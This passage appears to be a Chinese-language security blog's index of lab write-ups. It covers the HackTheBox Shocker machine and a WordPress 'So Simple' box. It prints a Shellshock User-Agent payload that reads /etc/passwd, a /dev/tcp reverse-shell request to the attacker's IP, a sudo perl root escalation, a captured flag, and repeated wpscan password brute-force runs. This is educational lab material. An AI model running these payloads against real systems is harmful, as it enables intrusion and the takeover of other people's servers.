AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH | 256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc= | 256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=5/1%OT=80%CT=1%CU=31082%PV=Y%DS=2%DC=T%G=Y%TM=644F2A80 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)SEQ( OS:SP=105%GCD=1%ISR=108%TI=Z%II=I%TS=8)OPS(O1=M53AST11NW6%O2=M53AST11NW6%O3 OS:=M53ANNT11NW6%O4=M53AST11NW6%O5=M53AST11NW6%O6=M53AST11)WIN(W1=7120%W2=7 OS:120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M53ANNSNW OS:6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O= OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W= OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Uptime guess: 0.601 days (since Sun Apr 30 20:31:11 2023) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=261 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 对默认端口进行了扫描，开放了80，22端口。\ngobuster dir -u http://10.129.85.4/ -w /usr/share/wordlists/dirb/small.txt gobuster dir -u http://10.129.85.4/cgi-bin -w /usr/share/wordlists/dirb/small.txt -x sh,pl ===============================================================\rGobuster v3.5\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://10.129.85.4/cgi-bin\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirb/small.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.5\r[+] Extensions: sh,pl\r[+] Timeout: 10s\r===============================================================\r2023/05/01 10:54:28 Starting gobuster in directory enumeration mode\r===============================================================\r/user.sh (Status: 200) [Size: 118]\rProgress: 2877 / 2880 (99.90%)\r===============================================================\r2023/05/01 10:56:21 Finished\r===============================================================\r目录扫描的过程中发现存在/cgi-bin/目录，目录下有个user.sh，继续尝试看看是否存在shellshock漏洞\nGET /cgi-bin/user.sh HTTP/1.1\rHost: 10.129.85.4\rUser-Agent: () { :; }; echo; /bin/cat /etc/passwd\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rConnection: close\rUpgrade-Insecure-Requests: 1\rPragma: no-cache\rCache-Control: no-cache HTTP/1.1 200 OK\rDate: Mon, 01 May 2023 03:28:17 GMT\rServer: Apache/2.4.18 (Ubuntu)\rConnection: close\rContent-Type: text/x-sh\rContent-Length: 1567\rroot:x:0:0:root:/root:/bin/bash\rdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\rbin:x:2:2:bin:/bin:/usr/sbin/nologin\rsys:x:3:3:sys:/dev:/usr/sbin/nologin\rsync:x:4:65534:sync:/bin:/bin/sync\rgames:x:5:60:games:/usr/games:/usr/sbin/nologin\rman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\rlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\rmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\rnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\ruucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\rproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\rwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\rbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\rlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\rirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\rgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\rnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\rsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false\rsystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false\rsystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false\rsystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false\rsyslog:x:104:108::/home/syslog:/bin/false\r_apt:x:105:65534::/nonexistent:/bin/false\rlxd:x:106:65534::/var/lib/lxd/:/bin/false\rmessagebus:x:107:111::/var/run/dbus:/bin/false\ruuidd:x:108:112::/run/uuidd:/bin/false\rdnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false\rsshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin\rshelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bash OK,payload为\n() { :; }; echo; /bin/cat /etc/passwd 该Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以(){开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。 将payload插入user-agent，cookie等请求头中，发送请求，发现服务端已经将payload作为bash命令执行了。下一步，我想到的是反弹目标的shell到msf上。 GET /cgi-bin/user.sh HTTP/1.1\rHost: 10.129.85.4\rUser-Agent: () { :; }; echo;/bin/sh -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.9/1234 0\u0026gt;\u0026amp;1\rContent-Length: 299\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rConnection: close\rUpgrade-Insecure-Requests: 1\rPragma: no-cache\rCache-Control: no-cache nc -nlvp 1234 $ pwd /usr/lib/cgi-bin\r$ cd /\r$ ls\rbin\rboot\rdev\retc\rhome\rinitrd.img\rlib\rlib64\rlost+found\rmedia\rmnt\ropt\rproc\rroot\rrun\rsbin\rsnap\rsrv\rsys\rtmp\rusr\rvar\rvmlinuz\r$ cd home\r$ ls\rshelly\r$ cd shelly\r$ pwd\r/home/shelly\r$ ls\ruser.txt\r$ cat user.txt\r30805fc5d34502c55ba370c803bd5628 到此，拿下shelly用户的flag。尝试进一步提权到root\nsudo -l\rsudo perl -e \u0026#39;exec \u0026#34;/bin/bash\u0026#34;;\u0026#39;\rwhoami\rcd /root\rcat root.txt ","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/shocker/","summary":"GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或","title":""},{"content":"┌──(root💀Chinchin)-[~/桌面/vpn]\r└─# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.195.78\rStarting Nmap 7.93 ( https://nmap.org ) at 2023-05-18 21:40 CST\rStats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan\rService scan Timing: About 50.00% done; ETC: 21:40 (0:00:06 remaining)\rNmap scan report for 192.168.195.78\rHost is up (0.27s latency).\rNot shown: 65533 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 3072 5b5543efafd03d0e63207af4ac416a45 (RSA)\r| 256 53f5231be9aa8f41e218c6055007d8d4 (ECDSA)\r|_ 256 55b77b7e0bf54d1bdfc35da1d768a96b (ED25519)\r80/tcp open http Apache httpd 2.4.41 ((Ubuntu))\r|_http-title: So Simple\r|_http-server-header: Apache/2.4.41 (Ubuntu)\rNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\rTCP/IP fingerprint:\rOS:SCAN(V=7.93%E=4%D=5/18%OT=22%CT=1%CU=42083%PV=Y%DS=4%DC=T%G=Y%TM=64662AF\rOS:6%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%II=I%TS=A)SEQ(SP=1\rOS:06%GCD=1%ISR=10B%TI=Z%TS=A)OPS(O1=M551ST11NW7%O2=M551ST11NW7%O3=M551NNT1\rOS:1NW7%O4=M551ST11NW7%O5=M551ST11NW7%O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE\rOS:88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q=\rOS:)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y\rOS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=16\rOS:4%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=A5B4%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\rNetwork Distance: 4 hops\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE (using port 8888/tcp)\rHOP RTT ADDRESS\r1 273.41 ms 192.168.45.1\r2 273.36 ms 192.168.45.254\r3 ...\r4 273.46 ms 192.168.195.78\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 59.87 seconds\r目录探测中发现/wordpress目录，尝试用wpscan枚举账户名，爆破密码\nwpscan --url http://192.168.195.78/wordpress/ --enumerate u ┌──(root💀Chinchin)-[~/桌面/vpn]\r└─# wpscan --url http://192.168.195.78/wordpress/ --username admin --wordlist /usr/share/wordlists/rockyou.txt\rScan Aborted: invalid option: --username\rDid you mean? usernames\r┌──(root💀Chinchin)-[~/桌面/vpn]\r└─# wpscan --url http://192.168.195.78/wordpress/ --usernames admin --wordlist /usr/share/wordlists/rockyou.txt --threads 50\rScan Aborted: invalid option: --wordlist\r┌──(root💀Chinchin)-[~/桌面/vpn]\r└─# wpscan --url http://192.168.195.78/wordpress/ --wordlist /usr/share/wordlists/rockyou.txt --usernames admin --threads 50\rScan Aborted: invalid option: --wordlist\r┌──(root💀Chinchin)-[~/桌面/vpn]\r└─# wpscan --url http://192.168.195.78/wordpress/ /usr/share/wordlists/rockyou.txt --usernames admin --threads 50 1 ⨯\rScan Aborted: invalid option: --threads\r┌──(root💀Chinchin)-[~/桌面/vpn]\r└─# wpscan --url http://192.168.195.78/wordpress/ /usr/share/wordlists/rockyou.txt --usernames admin 1 ⨯\r_______________________________________________________________\r__ _______ _____\r\\ \\ / / __ \\ / ____|\r\\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ®\r\\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\\r\\ /\\ / | | ____) | (__| (_| | | | |\r\\/ \\/ |_| |_____/ \\___|\\__,_|_| |_|\rWordPress Security Scanner by the WPScan Team\rVersion 3.8.22\rSponsored by Automattic - https://automattic.com/\r@_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\r_______________________________________________________________\r[+] URL: http://192.168.195.78/wordpress/ [192.168.195.78]\r[+] Started: Thu May 18 21:59:21 2023\rInteresting Finding(s):\r[+] Headers\r| Interesting Entry: Server: Apache/2.4.41 (Ubuntu)\r| Found By: Headers (Passive Detection)\r| Confidence: 100%\r[+] XML-RPC seems to be enabled: http://192.168.195.78/wordpress/xmlrpc.php\r| Found By: Direct Access (Aggressive Detection)\r| Confidence: 100%\r| References:\r| - http://codex.wordpress.org/XML-RPC_Pingback_API\r| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\r| - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\r| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\r| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\r[+] WordPress readme found: http://192.168.195.78/wordpress/readme.html\r| Found By: Direct Access (Aggressive Detection)\r| Confidence: 100%\r[+] Upload directory has listing enabled: http://192.168.195.78/wordpress/wp-content/uploads/\r| Found By: Direct Access (Aggressive Detection)\r| Confidence: 100%\r[+] The external WP-Cron seems to be enabled: http://192.168.195.78/wordpress/wp-cron.php\r| Found By: Direct Access (Aggressive Detection)\r| Confidence: 60%\r| References:\r| - https://www.iplocation.net/defend-wordpress-from-ddos\r| - https://github.com/wpscanteam/wpscan/issues/1299\r[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).\r| Found By: Rss Generator (Passive Detection)\r| - http://192.168.195.78/wordpress/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.2\u0026lt;/generator\u0026gt;\r| - http://192.168.195.78/wordpress/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.2\u0026lt;/generator\u0026gt;\r[+] WordPress theme in use: twentynineteen\r| Location: http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/\r| Last Updated: 2023-03-29T00:00:00.000Z\r| Readme: http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/readme.txt\r| [!] The version is out of date, the latest version is 2.5\r| Style URL: http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6\r| Style Name: Twenty Nineteen\r| Style URI: https://wordpress.org/themes/twentynineteen/\r| Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...\r| Author: the WordPress team\r| Author URI: https://wordpress.org/\r|\r| Found By: Css Style In Homepage (Passive Detection)\r|\r| Version: 1.6 (80% confidence)\r| Found By: Style (Passive Detection)\r| - http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6, Match: \u0026#39;Version: 1.6\u0026#39;\r[+] Enumerating All Plugins (via Passive Methods)\r[+] Checking Plugin Versions (via Passive and Aggressive Methods)\r[i] Plugin(s) Identified:\r[+] simple-cart-solution\r| Location: http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/\r| Last Updated: 2022-04-17T20:50:00.000Z\r| [!] The version is out of date, the latest version is 1.0.2\r|\r| Found By: Urls In Homepage (Passive Detection)\r|\r| Version: 0.2.0 (100% confidence)\r| Found By: Query Parameter (Passive Detection)\r| - http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/assets/dist/js/public.js?ver=0.2.0\r| Confirmed By:\r| Readme - Stable Tag (Aggressive Detection)\r| - http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/readme.txt\r| Readme - ChangeLog Section (Aggressive Detection)\r| - http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/readme.txt\r[+] social-warfare\r| Location: http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/\r| Last Updated: 2023-02-15T16:23:00.000Z\r| [!] The version is out of date, the latest version is 4.4.1\r|\r| Found By: Urls In Homepage (Passive Detection)\r| Confirmed By: Comment (Passive Detection)\r|\r| Version: 3.5.0 (100% confidence)\r| Found By: Comment (Passive Detection)\r| - http://192.168.195.78/wordpress/, Match: \u0026#39;Social Warfare v3.5.0\u0026#39;\r| Confirmed By:\r| Query Parameter (Passive Detection)\r| - http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.0\r| - http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.0\r| Readme - Stable Tag (Aggressive Detection)\r| - http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/readme.txt\r| Readme - ChangeLog Section (Aggressive Detection)\r| - http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/readme.txt\r[+] Enumerating Config Backups (via Passive and Aggressive Methods)\rChecking Config Backups - Time: 00:00:10 \u0026lt;=========================================\u0026gt; (137 / 137) 100.00% Time: 00:00:10\r[i] No Config Backups Found.\r[!] No WPScan API Token given, as a result vulnerability data has not been output.\r[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\r[+] Finished: Thu May 18 21:59:49 2023\r[+] Requests Done: 174\r[+] Cached Requests: 5\r[+] Data Sent: 48.665 KB\r[+] Data Received: 576.617 KB\r[+] Memory used: 247.449 MB\r[+] Elapsed time: 00:00:28\r┌──(root💀Chinchin)-[~/桌面/vpn]\r└─# wpscan --url http://192.168.195.78/wordpress/ -u admin -P /usr/share/wordlists/rockyou.txt --threads 50\rScan Aborted: invalid option: -u\rDid you mean? ua\r┌──(root💀Chinchin)-[~/桌面/vpn]\r└─# wpscan --url http://192.168.195.78/wordpress/ -U admin -P /usr/share/wordlists/rockyou.txt --threads 50 1 ⨯\rScan Aborted: invalid option: --threads\r┌──(root💀Chinchin)-[~/桌面/vpn]\r└─# wpscan --url http://192.168.195.78/wordpress/ -U admin -P /usr/share/wordlists/rockyou.txt \\ 1 ⨯\r\u0026gt; ┌──(root💀Chinchin)-[~/桌面/vpn]\r└─# wpscan --url http://192.168.195.78/wordpress/ -U admin -P /usr/share/wordlists/rockyou.txt 130 ⨯\r_______________________________________________________________\r__ _______ _____\r\\ \\ / / __ \\ / ____|\r\\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ®\r\\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\\r\\ /\\ / | | ____) | (__| (_| | | | |\r\\/ \\/ |_| |_____/ \\___|\\__,_|_| |_|\rWordPress Security Scanner by the WPScan Team\rVersion 3.8.22\rSponsored by Automattic - https://automattic.com/\r@_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\r_______________________________________________________________\r[+] URL: http://192.168.195.78/wordpress/ [192.168.195.78]\r[+] Started: Thu May 18 22:01:49 2023\rInteresting Finding(s):\r[+] Headers\r| Interesting Entry: Server: Apache/2.4.41 (Ubuntu)\r| Found By: Headers (Passive Detection)\r| Confidence: 100%\r[+] XML-RPC seems to be enabled: http://192.168.195.78/wordpress/xmlrpc.php\r| Found By: Direct Access (Aggressive Detection)\r| Confidence: 100%\r| References:\r| - http://codex.wordpress.org/XML-RPC_Pingback_API\r| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\r| - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\r| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\r| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\r[+] WordPress readme found: http://192.168.195.78/wordpress/readme.html\r| Found By: Direct Access (Aggressive Detection)\r| Confidence: 100%\r[+] Upload directory has listing enabled: http://192.168.195.78/wordpress/wp-content/uploads/\r| Found By: Direct Access (Aggressive Detection)\r| Confidence: 100%\r[+] The external WP-Cron seems to be enabled: http://192.168.195.78/wordpress/wp-cron.php\r| Found By: Direct Access (Aggressive Detection)\r| Confidence: 60%\r| References:\r| - https://www.iplocation.net/defend-wordpress-from-ddos\r| - https://github.com/wpscanteam/wpscan/issues/1299\r[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).\r| Found By: Rss Generator (Passive Detection)\r| - http://192.168.195.78/wordpress/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.2\u0026lt;/generator\u0026gt;\r| - http://192.168.195.78/wordpress/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.2\u0026lt;/generator\u0026gt;\r[+] WordPress theme in use: twentynineteen\r| Location: http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/\r| Last Updated: 2023-03-29T00:00:00.000Z\r| Readme: http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/readme.txt\r| [!] The version is out of date, the latest version is 2.5\r| Style URL: http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6\r| Style Name: Twenty Nineteen\r| Style URI: https://wordpress.org/themes/twentynineteen/\r| Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...\r| Author: the WordPress team\r| Author URI: https://wordpress.org/\r|\r| Found By: Css Style In Homepage (Passive Detection)\r|\r| Version: 1.6 (80% confidence)\r| Found By: Style (Passive Detection)\r| - http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6, Match: \u0026#39;Version: 1.6\u0026#39;\r[+] Enumerating All Plugins (via Passive Methods)\r[+] Checking Plugin Versions (via Passive and Aggressive Methods)\r[i] Plugin(s) Identified:\r[+] simple-cart-solution\r| Location: http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/\r| Last Updated: 2022-04-17T20:50:00.000Z\r| [!] The version is out of date, the latest version is 1.0.2\r|\r| Found By: Urls In Homepage (Passive Detection)\r|\r| Version: 0.2.0 (100% confidence)\r| Found By: Query Parameter (Passive Detection)\r| - http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/assets/dist/js/public.js?ver=0.2.0\r| Confirmed By:\r| Readme - Stable Tag (Aggressive Detection)\r| - http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/readme.txt\r| Readme - ChangeLog Section (Aggressive Detection)\r| - http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/readme.txt\r[+] social-warfare\r| Location: http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/\r| Last Updated: 2023-02-15T16:23:00.000Z\r| [!] The version is out of date, the latest version is 4.4.1\r|\r| Found By: Urls In Homepage (Passive Detection)\r| Confirmed By: Comment (Passive Detection)\r|\r| Version: 3.5.0 (100% confidence)\r| Found By: Comment (Passive Detection)\r| - http://192.168.195.78/wordpress/, Match: \u0026#39;Social Warfare v3.5.0\u0026#39;\r| Confirmed By:\r| Query Parameter (Passive Detection)\r| - http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.0\r| - http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.0\r| Readme - Stable Tag (Aggressive Detection)\r| - http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/readme.txt\r| Readme - ChangeLog Section (Aggressive Detection)\r| - http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/readme.txt\r[+] Enumerating Config Backups (via Passive and Aggressive Methods)\rChecking Config Backups - Time: 00:00:09 \u0026lt;=========================================\u0026gt; (137 / 137) 100.00% Time: 00:00:09 ┌──(root💀Chinchin)-[~/桌面/vpn]\r└─# wpscan --url http://192.168.195.78/wordpress/ -U MAX -P /usr/share/wordlists/rockyou.txt _______________________________________________________________\r__ _______ _____\r\\ \\ / / __ \\ / ____|\r\\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ®\r\\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\\r\\ /\\ / | | ____) | (__| (_| | | | |\r\\/ \\/ |_| |_____/ \\___|\\__,_|_| |_|\rWordPress Security Scanner by the WPScan Team\rVersion 3.8.22\rSponsored by Automattic - https://automattic.com/\r@_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\r_______________________________________________________________\r^C^C\rScan Aborted: Canceled by User\r┌──(root💀Chinchin)-[~/桌面/vpn]\r└─# wpscan --url http://192.168.195.78/wordpress/ -U max -P /usr/share/wordlists/rockyou.txt 2 ⨯\r_______________________________________________________________\r__ _______ _____\r\\ \\ / / __ \\ / ____|\r\\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ®\r\\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\\r\\ /\\ / | | ____) | (__| (_| | | | |\r\\/ \\/ |_| |_____/ \\___|\\__,_|_| |_|\rWordPress Security Scanner by the WPScan Team\rVersion 3.8.22\rSponsored by Automattic - https://automattic.com/\r@_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\r_______________________________________________________________\r[+] URL: http://192.168.195.78/wordpress/ [192.168.195.78]\r[+] Started: Thu May 18 22:02:37 2023\rInteresting Finding(s):\r[+] Headers\r| Interesting Entry: Server: Apache/2.4.41 (Ubuntu)\r| Found By: Headers (Passive Detection)\r| Confidence: 100%\r[+] XML-RPC seems to be enabled: http://192.168.195.78/wordpress/xmlrpc.php\r| Found By: Direct Access (Aggressive Detection)\r| Confidence: 100%\r| References:\r| - http://codex.wordpress.org/XML-RPC_Pingback_API\r| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\r| - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\r| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\r| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\r[+] WordPress readme found: http://192.168.195.78/wordpress/readme.html\r| Found By: Direct Access (Aggressive Detection)\r| Confidence: 100%\r[+] Upload directory has listing enabled: http://192.168.195.78/wordpress/wp-content/uploads/\r| Found By: Direct Access (Aggressive Detection)\r| Confidence: 100%\r[+] The external WP-Cron seems to be enabled: http://192.168.195.78/wordpress/wp-cron.php\r| Found By: Direct Access (Aggressive Detection)\r| Confidence: 60%\r| References:\r| - https://www.iplocation.net/defend-wordpress-from-ddos\r| - https://github.com/wpscanteam/wpscan/issues/1299\r[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).\r| Found By: Rss Generator (Passive Detection)\r| - http://192.168.195.78/wordpress/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.2\u0026lt;/generator\u0026gt;\r| - http://192.168.195.78/wordpress/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.2\u0026lt;/generator\u0026gt;\r[+] WordPress theme in use: twentynineteen\r| Location: http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/\r| Last Updated: 2023-03-29T00:00:00.000Z\r| Readme: http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/readme.txt\r| [!] The version is out of date, the latest version is 2.5\r| Style URL: http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6\r| Style Name: Twenty Nineteen\r| Style URI: https://wordpress.org/themes/twentynineteen/\r| Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...\r| Author: the WordPress team\r| Author URI: https://wordpress.org/\r|\r| Found By: Css Style In Homepage (Passive Detection)\r|\r| Version: 1.6 (80% confidence)\r| Found By: Style (Passive Detection)\r| - http://192.168.195.78/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6, Match: \u0026#39;Version: 1.6\u0026#39;\r[+] Enumerating All Plugins (via Passive Methods)\r[+] Checking Plugin Versions (via Passive and Aggressive Methods)\r[i] Plugin(s) Identified:\r[+] simple-cart-solution\r| Location: http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/\r| Last Updated: 2022-04-17T20:50:00.000Z\r| [!] The version is out of date, the latest version is 1.0.2\r|\r| Found By: Urls In Homepage (Passive Detection)\r|\r| Version: 0.2.0 (100% confidence)\r| Found By: Query Parameter (Passive Detection)\r| - http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/assets/dist/js/public.js?ver=0.2.0\r| Confirmed By:\r| Readme - Stable Tag (Aggressive Detection)\r| - http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/readme.txt\r| Readme - ChangeLog Section (Aggressive Detection)\r| - http://192.168.195.78/wordpress/wp-content/plugins/simple-cart-solution/readme.txt\r[+] social-warfare\r| Location: http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/\r| Last Updated: 2023-02-15T16:23:00.000Z\r| [!] The version is out of date, the latest version is 4.4.1\r|\r| Found By: Urls In Homepage (Passive Detection)\r| Confirmed By: Comment (Passive Detection)\r|\r| Version: 3.5.0 (100% confidence)\r| Found By: Comment (Passive Detection)\r| - http://192.168.195.78/wordpress/, Match: \u0026#39;Social Warfare v3.5.0\u0026#39;\r| Confirmed By:\r| Query Parameter (Passive Detection)\r| - http://192.168.195.78/wordpress/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.0\r| - 